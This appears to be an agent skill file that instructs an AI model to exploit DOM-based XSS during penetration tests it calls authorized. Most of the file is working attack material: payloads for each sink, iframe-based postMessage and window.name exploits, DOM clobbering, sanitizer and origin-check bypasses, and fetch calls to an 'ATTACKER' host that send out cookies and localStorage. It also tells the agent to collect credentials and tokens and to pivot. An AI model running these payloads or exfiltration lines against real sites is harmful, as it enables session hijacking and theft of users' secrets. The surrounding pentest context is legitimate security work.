---
name: xss-dom
description: >
  Guide DOM-based XSS exploitation during authorized penetration testing.
keywords:
  - DOM XSS
  - DOM-based XSS
  - innerHTML injection
  - eval injection
  - document.write XSS
  - postMessage XSS
  - source and sink
  - client-side XSS
  - JavaScript DOM manipulation
tools:
  - burpsuite
  - DOM Invader
  - domloggerpp
  - domdig
opsec: low
---

# DOM-Based XSS

You are helping a penetration tester exploit DOM-based cross-site scripting. The
vulnerability exists entirely in client-side JavaScript — attacker-controlled
data flows from a source (URL, cookie, postMessage, storage) to a dangerous sink
(innerHTML, eval, document.write) without proper sanitization. The malicious
payload never appears in the HTTP response from the server. All testing is under
explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[xss-dom] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Web Interaction

DOM XSS exists entirely in client-side JavaScript — **browser tools are
essential** for this skill. The vulnerability cannot be detected or exploited
without JavaScript execution.

- **`browser_open`** to load the target page with JavaScript execution
- **`browser_evaluate`** for source-to-sink tracing — inspect DOM state, trace
  data flow through JavaScript variables, check what sinks are reachable
  (e.g., `document.querySelectorAll('[innerHTML]')`,
  `document.querySelectorAll('script')`)
- **`browser_navigate`** with crafted URL fragments (`#payload`) to test
  hash-based sources
- **`browser_screenshot`** for evidence of DOM manipulation
- **curl is insufficient** for DOM XSS — it doesn't execute JavaScript, so it
  cannot trigger source-to-sink flows

## Prerequisites

- Access to the target page's JavaScript (view source, browser DevTools)
- Understanding that DOM XSS payloads often go in URL fragments (`#`), which are
  NOT sent to the server
- Tools: browser DevTools (Sources/Console), DOM Invader (Burp Suite built-in),
  domloggerpp (browser extension)

## Step 1: Assess

If not already provided, determine:
1. **Target page** — URL of the page with client-side JavaScript
2. **Suspected source** — where does attacker input enter the DOM? (URL hash, query param, cookie, postMessage, localStorage)
3. **Suspected sink** — where does the data get used unsafely?

Skip if context was already provided.

## Step 2: Identify Sources

Sources are inputs an attacker can control. Check each one:

**URL-based sources:**
```javascript
document.URL
document.documentURI
document.baseURI
location              // location.href, location.hash, location.search, location.pathname
document.referrer
```

**Storage-based sources:**
```javascript
document.cookie
window.name           // persists across cross-origin navigations!
localStorage
sessionStorage
```

**Message-based sources:**
```javascript
// postMessage listener
window.addEventListener('message', function(e) { /* uses e.data unsafely */ })
```

**How to find them:** Search the page's JavaScript for these patterns. In
DevTools → Sources → Search (Ctrl+Shift+F):

```
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage
addEventListener.*message
localStorage.getItem
sessionStorage.getItem
document.cookie
```

## Step 3: Identify Sinks

Sinks are functions/properties where attacker data causes harm.

**HTML injection sinks** (most common for DOM XSS):
```javascript
element.innerHTML = ...
element.outerHTML = ...
element.insertAdjacentHTML(...)
document.write(...)
document.writeln(...)
```

> `innerHTML` blocks `<script>` tags in modern browsers. Use `<img onerror>` instead.

**JavaScript execution sinks:**
```javascript
eval(...)
Function(...)()
setTimeout(string, ...)
setInterval(string, ...)
setImmediate(string, ...)
```

**URL/navigation sinks:**
```javascript
location = ...
location.href = ...
location.assign(...)
location.replace(...)
window.open(...)
```

**jQuery sinks:**
```javascript
$(...)                 // selector injection
$.html(...)
$.append(...)
$.prepend(...)
$.after(...)
$.before(...)
$.parseHTML(...)
$.globalEval(...)
```

## Step 4: Trace the Data Flow

Follow the data from source to sink through the JavaScript code.

**Example 1 — URL hash to innerHTML:**
```javascript
// Vulnerable code
var content = location.hash.substring(1);
document.getElementById('output').innerHTML = content;

// Exploit (payload in URL fragment — not sent to server)
https://TARGET/page#<img src=x onerror=alert(document.domain)>
```

**Example 2 — URL param to document.write:**
```javascript
// Vulnerable code
var search = new URLSearchParams(location.search);
document.write('<h1>Results for: ' + search.get('q') + '</h1>');

// Exploit
https://TARGET/page?q=</h1><script>alert(document.domain)</script>
```

**Example 3 — URL param to eval:**
```javascript
// Vulnerable code
var config = location.search.substring(1);
eval('var settings = {' + config + '}');

// Exploit
https://TARGET/page?};alert(document.domain);//
```

**Example 4 — postMessage to innerHTML:**
```javascript
// Vulnerable code
window.addEventListener('message', function(e) {
  document.getElementById('widget').innerHTML = e.data;
});

// Exploit (from attacker page)
<iframe src="https://TARGET/page" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
```

**Example 5 — window.name abuse:**
```javascript
// Vulnerable code
document.getElementById('greeting').innerHTML = name;  // resolves to window.name

// Exploit (window.name persists across navigations)
<iframe name="<img src=x onerror=alert(document.domain)>" src="https://TARGET/page">
```

**Example 6 — jQuery selector injection:**
```javascript
// Vulnerable code
$(location.hash);

// Exploit
https://TARGET/page#<img src=x onerror=alert(1)>
```

## Step 5: Sink-Specific Payloads

### innerHTML / outerHTML
`<script>` is blocked — use event handlers:
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
```

### document.write / document.writeln
```html
</h1><script>alert(document.domain)</script>
<script>alert(document.domain)</script>
```

### eval / Function / setTimeout(string)
```javascript
);alert(document.domain);//
'-alert(document.domain)-'
1;alert(document.domain)
```

### location / location.href / location.assign
```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
```

### jQuery $() selector
```html
<img src=x onerror=alert(1)>
```

### postMessage
Craft an attacker page that sends the payload:
```html
<iframe src="https://TARGET/page" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')
">
```

## Step 6: DOM Clobbering

When the page references DOM elements by name/id without proper checks, you can
"clobber" expected values by injecting HTML elements with matching names.

```html
<!-- If code does: if (window.config) { url = config.url } -->
<a id=config><a id=config name=url href="javascript:alert(1)">

<!-- If code does: element.innerHTML = defaultText -->
<img name=defaultText src=x onerror=alert(1)>
```

## Step 7: Demonstrate Impact

Same as reflected/stored XSS — cookie theft, session hijacking, phishing:

```javascript
fetch('https://ATTACKER/steal?c='+document.cookie)
fetch('https://ATTACKER/steal?ls='+JSON.stringify(localStorage))
```

For `window.name` + admin flows, exfiltrate secrets from localStorage:
```javascript
fetch('https://ATTACKER/?flag='+encodeURIComponent(localStorage.getItem('flag')))
```

## Step 8: Escalate or Pivot

- **Payload appears in HTTP response too**: May also be reflected — route to **xss-reflected**
- **Payload persists for other users**: Stored DOM XSS — route to **xss-stored**
- **postMessage with no origin check**: Can be exploited cross-origin from any page
- **DOM XSS on login page**: Credential theft via phishing overlay

Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: source, sink, data flow path, and working payload.

## OPSEC Notes

- DOM XSS is entirely client-side — no server logs of the attack payload
- URL fragment (`#`) payloads are never sent to the server
- postMessage exploits require the victim to visit an attacker-controlled page
- DevTools analysis leaves no artifacts on the target

## Troubleshooting

### Can't Find the Sink
- Use DOM Invader (Burp Suite) — automatically traces sources to sinks
- Use domloggerpp browser extension — logs all DOM property access
- Search JS for known sink patterns (Step 3)
- Check for dynamically loaded scripts — use Network tab to find all JS files

### innerHTML Blocks Script Tags
This is expected in modern browsers. Use:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

### Payload URL-Encoded by Browser
- URL fragment (`#`) payloads may be URL-encoded by the browser before JS reads them
- Check if the code calls `decodeURIComponent()` on the source
- Try double-encoding or using a source that isn't URL-encoded (cookie, postMessage, window.name)

### DOMPurify or Sanitizer Present
- Check the DOMPurify version — older versions have known bypasses
- Try mutation XSS: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
- Check if sanitization is applied to all sources or just some (partial sanitization gaps)
- Check for DOM clobbering to bypass sanitizer configuration

### postMessage Has Origin Check
If the listener checks `event.origin`:
```javascript
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  // ...
});
```
- Check if the origin check is strict (`===`) or uses `indexOf`/regex (bypassable)
- `e.origin.indexOf('trusted.com')` matches `https://trusted.com.attacker.com`
- Check if any trusted origin has an open redirect or XSS you can chain

### Automated Tools
```bash
# DOM Invader — built into Burp Suite browser
# Enable in Burp → Proxy → Intercept → Open Browser → DOM Invader tab

# domdig — headless Chrome DOM XSS scanner
domdig https://TARGET/page

# domloggerpp — browser extension for monitoring DOM access
# Install from: https://github.com/kevin-mizu/domloggerpp
```
